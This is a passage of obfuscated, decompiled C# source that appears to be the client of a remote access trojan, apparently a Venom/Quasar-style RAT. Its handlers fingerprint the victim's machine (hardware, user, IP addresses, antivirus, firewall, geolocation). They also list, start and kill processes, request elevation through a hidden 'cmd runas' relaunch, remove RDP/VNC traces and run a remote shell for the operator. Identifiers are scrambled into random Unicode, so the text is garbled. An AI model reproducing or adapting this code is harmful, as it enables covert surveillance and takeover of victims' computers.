      string str1 = !string.IsNullOrEmpty(globalProperties.DomainName) ? globalProperties.DomainName : "-";
      string str2 = !string.IsNullOrEmpty(globalProperties.HostName) ? globalProperties.HostName : "-";
      new GetSystemInfoResponse(new string[36]
      {
        "Processor (CPU)",
        톼\uFE1Fϓ䍁얙뉿椺ꝳ\u2E1D\u21AB碓ጯ\uFFFD璅囐痱뻌ᕤ\uE262琝.\uFFFD鞻\uE7D5䎿\u0E8F\uE4A8ᮌ惑늽巁\uE0B6冕ꞗ闾櫆㵹驗諗\uFDCC\uE97B(),
        "Memory (RAM)",
        string.Format("{0} MB", (object) 톼\uFE1Fϓ䍁얙뉿椺ꝳ\u2E1D\u21AB碓ጯ\uFFFD璅囐痱뻌ᕤ\uE262琝.멶\u1B79\uF46F쁘\uE62B㞼챯蝐拉뵂\uE3D5\uEFBF㑬浥\u2EA4颺\u2B0E㓻긲뉫()),
        "Video Card (GPU)",
        톼\uFE1Fϓ䍁얙뉿椺ꝳ\u2E1D\u21AB碓ጯ\uFFFD璅囐痱뻌ᕤ\uE262琝.扑ೱ掆饖ꛝế\uFFFD凿ڭ읫鵬\uFFFDⶎ谋\u0ECF收\uE647卻꽽벾(),
        "Username",
        \uFD49珄\uFFFD蕒혪삂덧珅\u2814̆㜓샄ퟥ댐晊动夯騧ꚝ길.䝩傷攍䘴꾳\uFFFDꀷᎆ뒂戕䔬용蛞Ḧᴡ䑌껠畒軔놕(),
        "PC Name",
        祙黓䏹蚓帹띣瓷뽥癚毭㛈钮ฑ玿缱䩾泰䐥坎况.깩\u1AFF\uEB42倃坄㖇\uF4F2겸甖멥ဣ䏾\uF348Ἰ\uF494铀옘妼\uF254\uFAF7(),
        "Domain Name",
        str1,
        "Host Name",
        str2,
        "System Drive",
        Path.GetPathRoot(Environment.SystemDirectory),
        "System Directory",
        Environment.SystemDirectory,
        "Uptime",
        祙黓䏹蚓帹띣瓷뽥癚毭㛈钮ฑ玿缱䩾泰䐥坎况.\uF2BC퓡ꀺ賓簳땗\uFFFD\u07FF檺뾊捸\uF6C6\uFFFD媏裃ಧ瘣\uFFFD똏뤡(),
        "MAC Address",
        톼\uFE1Fϓ䍁얙뉿椺ꝳ\u2E1D\u21AB碓ጯ\uFFFD璅囐痱뻌ᕤ\uE262琝.彘䉵얋\uEEDBꣁ\uFFFD瀿ꡟ㯭\uEF20鹁\uA4AD\uFF65\uFFFD솇שּׁ\uF51F먃猚쾋(),
        "LAN IP Address",
        톼\uFE1Fϓ䍁얙뉿椺ꝳ\u2E1D\u21AB碓ጯ\uFFFD璅囐痱뻌ᕤ\uE262琝.\u2A34\u0876鐨ꤸ랒ꕕ\uF2E4幤\u19DD\u2AE3印蕇黝\u00A4\uE838줨뻹鲓㵋᷈(),
        "WAN IP Address",
        ꃞВἘ\u1C38\uF8ACፁ췦\u2330穙힢馚淢်渡ꭱ\u1C87䬪筣곺\uFFFD.GeoInfo.Ip,
        "Antivirus",
        祙黓䏹蚓帹띣瓷뽥癚毭㛈钮ฑ玿缱䩾泰䐥坎况.Ꝍ\uEF3F㡟类\uFFFD쾣궨䘄蓀\uE067碚替ց㽴履㾀쇌蹜놃犹(),
        "Firewall",
        祙黓䏹蚓帹띣瓷뽥癚毭㛈钮ฑ玿缱䩾泰䐥坎况.헕㻼捶뉏퍧邑좫厔邉\uFFFD䶏皾\uECB6蝝쮞ꌽ佲텟\uFFFD磿(),
        "Time Zone",
        ꃞВἘ\u1C38\uF8ACፁ췦\u2330穙힢馚淢်渡ꭱ\u1C87䬪筣곺\uFFFD.GeoInfo.Timezone,
        "Country",
        ꃞВἘ\u1C38\uF8ACፁ췦\u2330穙힢馚淢်渡ꭱ\u1C87䬪筣곺\uFFFD.GeoInfo.Country,
        "ISP",
        ꃞВἘ\u1C38\uF8ACፁ췦\u2330穙힢馚淢်渡ꭱ\u1C87䬪筣곺\uFFFD.GeoInfo.Isp
      }).Execute(client);
    }
    catch
    {
    }
  }

  public static void \u1CE1\u0992茆꺽Ꮂ\uE45Cᙷ胯ᣀ껍\uEE10픗\uFFFD泌쓭\uE2BC娲凕\u1CB7闒(
    GetVncInfo command,
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 client)
  {
    try
    {
      IPGlobalProperties globalProperties = IPGlobalProperties.GetIPGlobalProperties();
      if (!string.IsNullOrEmpty(globalProperties.DomainName))
      {
        string domainName = globalProperties.DomainName;
      }
      if (!string.IsNullOrEmpty(globalProperties.HostName))
      {
        string hostName = globalProperties.HostName;
      }
      new GetVncInfoResponse(new string[2]
      {
        "Login",
        톼\uFE1Fϓ䍁얙뉿椺ꝳ\u2E1D\u21AB碓ጯ\uFFFD璅囐痱뻌ᕤ\uE262琝.䕖참調邬杷ꉆ뮱\u0E80齏\u1AD3瓌ₔᖥ㔛촁買㱀䲟Ⲿ鯚()
      }).Execute(client);
    }
    catch
    {
    }
  }

  public static void \u0FFEᾞ\uF23B㮾쳒뿑띺\uE27Eꩄ\u2BC5ﻩ\uFE67酲舁ႎ᭘\uE383ൈ\u24C8ꅔ(
    GetRdpInfo command,
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 client)
  {
    try
    {
      IPGlobalProperties globalProperties = IPGlobalProperties.GetIPGlobalProperties();
      if (!string.IsNullOrEmpty(globalProperties.DomainName))
      {
        string domainName = globalProperties.DomainName;
      }
      if (!string.IsNullOrEmpty(globalProperties.HostName))
      {
        string hostName = globalProperties.HostName;
      }
      new GetVncInfoResponse(new string[2]
      {
        "Login",
        톼\uFE1Fϓ䍁얙뉿椺ꝳ\u2E1D\u21AB碓ጯ\uFFFD璅囐痱뻌ᕤ\uE262琝.䢊ᔋ\u25CD\u2441廌\u07F8ᘣ\u2255骩䁈驣滥\uAADFꭆ㗍嗖ᝓᘔ畤얀()
      }).Execute(client);
    }
    catch
    {
    }
  }

  public static void 饽谎덁욬簶難䎬\u276D\uE771튃\u3368茶ḯ캡꼨軎\u177C慚黇漊(
    GetProcesses command,
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 client)
  {
    Process[] processes1 = Process.GetProcesses();
    string[] processes2 = new string[processes1.Length];
    int[] ids = new int[processes1.Length];
    string[] titles = new string[processes1.Length];
    int index = 0;
    foreach (Process process in processes1)
    {
      processes2[index] = process.ProcessName + ".exe";
      ids[index] = process.Id;
      titles[index] = process.MainWindowTitle;
      ++index;
    }
    new GetProcessesResponse(processes2, ids, titles).Execute(client);
  }

  public static void 糼퓒䥯鱦憳ꞕඡ둊橔\uE4A8蜫軕쐑槦㚽郧빩필譨\u007C(
    DoProcessStart command,
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 client)
  {
    if (string.IsNullOrEmpty(command.Processname))
    {
      new SetStatus("Process could not be started!").Execute(client);
    }
    else
    {
      try
      {
        Process.Start(new ProcessStartInfo()
        {
          UseShellExecute = true,
          FileName = command.Processname
        });
      }
      catch
      {
        new SetStatus("Process could not be started!").Execute(client);
      }
      finally
      {
        匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.饽谎덁욬簶難䎬\u276D\uE771튃\u3368茶ḯ캡꼨軎\u177C慚黇漊(new GetProcesses(), client);
      }
    }
  }

  public static void ռ\u4DFA똢\uE482\u21B8㽛腵\uEDEB畖催髍\u33F6㧝檆叿勨\uFFFD蕕즅थ(
    DoProcessKill command,
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 client)
  {
    try
    {
      Process.GetProcessById(command.PID).Kill();
    }
    catch
    {
    }
    finally
    {
      匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.饽谎덁욬簶難䎬\u276D\uE771튃\u3368茶ḯ캡꼨軎\u177C慚黇漊(new GetProcesses(), client);
    }
  }

  public static void 隼\uEE03\u3202撚浰꽥ۗ\uFFFDꏻ\u2427ᘧ홉顯瀨妟榭홍॑\uE6F4稢(
    DoAskElevate command,
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 client)
  {
    if (\uFD49珄\uFFFD蕒혪삂덧珅\u2814̆㜓샄ퟥ댐晊动夯騧ꚝ길.頵ޔ혜श谧\uF32Bꉘ蒃ﾇ諽緃騨啋䕇䥔\u2F82\u0FF5雋顃ᓌ() != "Admin")
    {
      ProcessStartInfo startInfo = new ProcessStartInfo()
      {
        FileName = "cmd",
        Verb = "runas",
        Arguments = "/k START \"\" \"" + 보㕟袓\u226B脆ݔ㿀槡鉦ꤼ\u2ED4遪ഐ猱\uF6C6고ະ敯\uEC6Eǈ.CurrentPath + "\" & EXIT",
        WindowStyle = ProcessWindowStyle.Hidden,
        UseShellExecute = true
      };
      \uE1A7\uA7CB\uE0FC͠蟂㞣흺茰\uED50뽇뎌ꈵስ㶬\u05ED㲃覩\uEAAE\u33C9ꑼ.\uA877Ἤ\uEC1Aꖀ쵘෫䶍婧컭\u272C糥燯ꤧ\u2407涊ත\uF6A9妦蒙\uEA51();
      try
      {
        Process.Start(startInfo);
      }
      catch
      {
        new SetStatus("User refused the elevation request.").Execute(client);
        \uE1A7\uA7CB\uE0FC͠蟂㞣흺茰\uED50뽇뎌ꈵስ㶬\u05ED㲃覩\uEAAE\u33C9ꑼ.\u0B46\u2E4E몿䮼뢐ޭ渧\uF05A\uFFFD漟ᙃ鍊䖔\u2A5B撛\uFFFD슍볻奩⁔(仂읤\uEC15솟콱윯蠻ꉹὲ樠ꮟ듌ﭤ뒉無롫ങ秽\u259B䀂.\u22D4망웩ꉳᴜ\u058D\uE1BD\uE3F1\uFFFD醩ⴿ鑪蚬\uFE53\uE92E\uF402ꬉ咺\uE00B㞱);
        return;
      }
      \uFFFD\uF44D闛ꒁ赹〭惓ﳶ嘞끝ᬏ챟ᒠ痷섏\uFFFD帴脊䳙\u218D.㞸\uFFFD鼉\u283D茤䳒\u2E58ߢ喒䀡隲ᓊ봨试啔짟톥迣㻯穏.\u31E7녿Ⅻ묋钮卵\u268F橢齄퍐紼죋\uF554ᴉ\u2873\uE17E衾眫螱ᑭ();
    }
    else
      new SetStatus("Process already elevated.").Execute(client);
  }

  public static void \uF8B0Ⱈ\u27FDැ嫲慎鱅분᩹풆䅆\uFFFD苺멢䪅悥얪\u232Fд\u235E(
    DoRemoveRdp command,
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 client)
  {
    ᒆ\uE9CD藷䰈콩헣\u248D榪쒷\uE171椐菹粉邀ꀥ퓱㖧鍁맯䎜.\uE87A国䗬ᇧ健慜悤\u33C7\uE079Փ嗙\uA4A3䧍劤ꢬ뚕針\uE279ஒ\u241C();
    ᒆ\uE9CD藷䰈콩헣\u248D榪쒷\uE171椐菹粉邀ꀥ퓱㖧鍁맯䎜.砓똠掳\uFFFD拫댑ꦧ\u2904躧꼧耆뵁鹇Ⰸ廘砭䉑䴯윏햯();
    ᒆ\uE9CD藷䰈콩헣\u248D榪쒷\uE171椐菹粉邀ꀥ퓱㖧鍁맯䎜.ṫ쫅鯽嘪鍣혅䈾揁臂溧勤簫\uFFFD觪큕랇쫆\uDB3E\uDE53ᠾ();
    \uEEA2抜鶘需謺ꍴ\uFFFD㛴ꆲ푐\uFFFDᯏᚇ䕫\uE44B᳥꤭虰\uE997ᆳ.镾\uF636춛瑐췓穋霏䥷\u293FṘ鑋ⳋ硴\u058F탁쒁䥑䬺瑊\uEF67();
    \uEEA2抜鶘需謺ꍴ\uFFFD㛴ꆲ푐\uFFFDᯏᚇ䕫\uE44B᳥꤭虰\uE997ᆳ.猤夔慉욕贕㾟觀킋揯\uED47刜菭\u1F1E\uF6B7贔㻎얡ᝬꓩ尓("Venom");
    ᒆ\uE9CD藷䰈콩헣\u248D榪쒷\uE171椐菹粉邀ꀥ퓱㖧鍁맯䎜.㶵㵽\uF207繈줗Ⴐ鼠\uFFFD幄ृ\u3368ኖ믖͇㒏賃\uFFFD徏쓥鈊();
    ᒆ\uE9CD藷䰈콩헣\u248D榪쒷\uE171椐菹粉邀ꀥ퓱㖧鍁맯䎜.\uE87A国䗬ᇧ健慜悤\u33C7\uE079Փ嗙\uA4A3䧍劤ꢬ뚕針\uE279ஒ\u241C();
  }

  public static void 㿵㜈멘怷\uFFFD柙楤롈ⵦ㩻ᘞ덓헁쵑\u26AB㳄\u19E3ሼ쁙\u10C6(
    DoRemoveVnc command,
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 client)
  {
    ᒆ\uE9CD藷䰈콩헣\u248D榪쒷\uE171椐菹粉邀ꀥ퓱㖧鍁맯䎜.\uE87A国䗬ᇧ健慜悤\u33C7\uE079Փ嗙\uA4A3䧍劤ꢬ뚕針\uE279ஒ\u241C();
    ᒆ\uE9CD藷䰈콩헣\u248D榪쒷\uE171椐菹粉邀ꀥ퓱㖧鍁맯䎜.砓똠掳\uFFFD拫댑ꦧ\u2904躧꼧耆뵁鹇Ⰸ廘砭䉑䴯윏햯();
    ᒆ\uE9CD藷䰈콩헣\u248D榪쒷\uE171椐菹粉邀ꀥ퓱㖧鍁맯䎜.茣ﮟ褐\uA493Ꞁ덣ﰑ\uF22F眘魪\uFFFD\u28E4쫥訉駉女ꆖ䉈㹑썳();
    ᒆ\uE9CD藷䰈콩헣\u248D榪쒷\uE171椐菹粉邀ꀥ퓱㖧鍁맯䎜.㶵㵽\uF207繈줗Ⴐ鼠\uFFFD幄ृ\u3368ኖ믖͇㒏賃\uFFFD徏쓥鈊();
    ᒆ\uE9CD藷䰈콩헣\u248D榪쒷\uE171椐菹粉邀ꀥ퓱㖧鍁맯䎜.\uE87A国䗬ᇧ健慜悤\u33C7\uE079Փ嗙\uA4A3䧍劤ꢬ뚕針\uE279ஒ\u241C();
  }

  public static void β䵷\uFFFD\u0EFA䅮車蚐а箚䏛響ക욍ꊊ婷ᥳ쌨\u2050掕\uF2AE(
    DoShellExecute command,
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 client)
  {
    string command1 = command.Command;
    if (匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.籷\uF855\u2E72\uFFFDㄸ郟䏚힊꽆犅除ﱆ錸䖾荒켫\uFFFD鈕鴚몬 == null && command1 == "exit")
      return;
    if (匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.籷\uF855\u2E72\uFFFDㄸ郟䏚힊꽆犅除ﱆ錸䖾荒켫\uFFFD鈕鴚몬 == null)
      匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.籷\uF855\u2E72\uFFFDㄸ郟䏚힊꽆犅除ﱆ錸䖾荒켫\uFFFD鈕鴚몬 = new Shell();
    if (command1 == "exit")
      匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.챊\u262C䞻젭ᾐ䧵ꍞ뢭\uF2AD鲋쫞麥\u25E3쒱저脌틼\uF627\u333D埔();
    else
      匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.籷\uF855\u2E72\uFFFDㄸ郟䏚힊꽆犅除ﱆ錸䖾荒켫\uFFFD鈕鴚몬.ExecuteCommand(command1);
  }

  public static void 챊\u262C䞻젭ᾐ䧵ꍞ뢭\uF2AD鲋쫞麥\u25E3쒱저脌틼\uF627\u333D埔()
  {
    if (匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.籷\uF855\u2E72\uFFFDㄸ郟䏚힊꽆犅除ﱆ錸䖾荒켫\uFFFD鈕鴚몬 == null)
      return;
    匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.籷\uF855\u2E72\uFFFDㄸ郟䏚힊꽆犅除ﱆ錸䖾荒켫\uFFFD鈕鴚몬.Dispose();
  }

  public struct 韾ꐩۿ㯠\u2F12Ӎ赃绡磰ꞑ\uF3DB툸شꍯ稹\uE799畷댌䑇䴌
  {
    public uint ꦉ䆘祛崳ꭾ厥븳霳\u0877\uE8D5ᤝ託\u22C6ʅ雐ᠲ㳑巨锳\uFFFD;
    public uint ᱲ\u137D\uA8DA㪨뒲䂼䈺\uE965읛쌛\uF6FF岬篬矼\uFDD8\uE63B뢸Ṋ웍澥;
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
    public byte[] \u0ABB\uFFFD弐鱫\u3332견㟺\uE39B昏놸蓴뢖퇵\uF187ｴ\uF347빱嫧댩ᬵ;
    public uint 爇歁닻槆쵋乛桩걛\uF1C1穘︁輙\uF38C\uDAE8\uDD38\uF5E6㣚\u2A24ᘞꈯ;
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
    public byte[] \uFFFD䍶\uF2AD귾堇몺\u32E9聳\uE179춍ꢖ\uE2D8ퟔɬ\uAB5B萐䛦삈艜ㄖ;
    public uint ꋽ턮됻ಈ휡댩蛬ꓥ\uFFFD\uF6AF\uED8A첓㟛\u275Bⶐ뗊\u2B3F炰촫늒;

    public IPAddress LocalAddress => new IPAddress((long) this.ᱲ\u137D\uA8DA㪨뒲䂼䈺\uE965읛쌛\uF6FF岬篬矼\uFDD8\uE63B뢸Ṋ웍澥);

    public ushort LocalPort => BitConverter.ToUInt16(new byte[2]
    {
      this.\u0ABB\uFFFD弐鱫\u3332견㟺\uE39B昏놸蓴뢖퇵\uF187ｴ\uF347빱嫧댩ᬵ[1],
      this.\u0ABB\uFFFD弐鱫\u3332견㟺\uE39B昏놸蓴뢖퇵\uF187ｴ\uF347빱嫧댩ᬵ[0]
    }, 0);

    public IPAddress RemoteAddress => new IPAddress((long) this.爇歁닻槆쵋乛桩걛\uF1C1穘︁輙\uF38C\uDAE8\uDD38\uF5E6㣚\u2A24ᘞꈯ);

    public ushort RemotePort => BitConverter.ToUInt16(new byte[2]
    {
      this.\uFFFD䍶\uF2AD귾堇몺\u32E9聳\uE179춍ꢖ\uE2D8ퟔɬ\uAB5B萐䛦삈艜ㄖ[1],
      this.\uFFFD䍶\uF2AD귾堇몺\u32E9聳\uE179춍ꢖ\uE2D8ퟔɬ\uAB5B萐䛦삈艜ㄖ[0]
    }, 0);
  }

  public struct 箠䉫\uEEFE\uFFFD꼶\uECFA\uF51F葥켌ꦲ鯔䠚鷘揙믷靜\uF799\u9FF6낲㳓
  {
    public uint 抨镖礫せ온\uE501鑓垑굉쥰﹏哣뫷鑉ﺨ썸褝핆佳銂;
    private readonly 匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.韾ꐩۿ㯠\u2F12Ӎ赃绡磰ꞑ\uF3DB툸شꍯ稹\uE799畷댌䑇䴌 ᦘ孃䤃꩔Ἷ욹\u3218늲犣Ꞧ鑆끸\u2719\uF74A\u267A鱠꘩闖䍘\u0C54;
  }

  private enum 䭖瘓䭙\uE21C爰\u295A褅龬\uFDC8뤼咶핵྆씦ｸ㥔㣇\uF3C4\u2987\u1C82
  {
    㥥瀿르ｍ押\uE5D4棡닗ᑝ裓\uF087볹ޮ\u197Cﻕ\uF215\u9FFF淯ច\u21CF,
    ༀ澗瀉ᥬ阆\uF09AꇮŜ袎\uE17E鬘긗렺똧咓낆\u2F4C耵㬾毘,
    㿵豢怢撫歳煉\uF642뗹ӷ뻹\uFFFD\uA7D0礷\uF019㳻갃簽ꏀﭣ檺,
    抿ꖭ첑횸瘾뇺ꖃ轶痭ￓ籄ᖡ햘ﬁ\uE2E8뽏粱쮚\uEC1E啘,
    頳때\u2295з魻ўᕄ䴋셲넞딀\u2BB1켄\uED93퉦펜\uFFFD젻\u32CDⷥ,
    漀\u2542䑘\u2AFC\uF8FF阶嫿ꜩ탧깾ᳮ䨗攓\u1AD6囂鍬曒ԉ쐖뫯,
    祡\uE695奯\u29CA뉶萐\uF56F헋䊜辦\uFFFD\u0011픗櫛੧َ怲\uF890입柙,
    \uEAFF抇뇊뜱R뉦괁䛙\uFFFD\uFFFD髆ⶔ\u22E6嵏俁밈쟜箋ᝰ嶺,
    \uE2E1莲랮㵀쟡倩\u2D7C稀噧\uFFFDɜᮜ頶䞋崊\u2E65챇耓\uFFFD巋,
  }
}
